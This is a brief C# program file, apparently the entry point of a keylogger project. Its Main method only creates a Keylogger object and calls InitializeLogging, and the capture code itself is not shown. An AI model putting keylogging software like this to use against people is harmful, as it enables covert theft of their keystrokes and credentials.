using System;   
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;

namespace KeyStrokeEvents
{
    class Program
    {
        
        static void Main(string[] args)
        {
            Keylogger keyLogger = new Keylogger();
            keyLogger.InitializeLogging();
        }

        
    }
}
